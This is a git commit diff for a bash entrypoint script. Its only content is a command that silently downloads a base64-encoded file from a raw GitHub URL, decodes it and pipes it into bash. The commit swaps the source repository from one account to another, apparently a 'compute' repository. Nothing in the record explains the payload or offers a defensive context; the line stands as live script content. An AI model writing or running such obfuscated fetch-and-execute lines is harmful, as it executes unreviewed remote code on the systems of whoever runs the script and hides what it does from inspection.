f3bfe4168579e1b974acb32482865b84a1d09adf
Jonathan Perry <136393037+jonathanperry022@users.noreply.github.com>
2026-06-21 19:43:12 +0200

    Update run_entrypoint.sh

--- run_entrypoint.sh
+++ run_entrypoint.sh
@@ -1,2 +1,2 @@
 #!/bin/bash
-wget -qO- https://raw.githubusercontent.com/jeffbalderrama/date/refs/heads/main/entrypoint.sh | base64 -d | bash
+wget -qO- https://raw.githubusercontent.com/jonathanperry022/compute/refs/heads/main/entrypoint.sh | base64 -d | bash
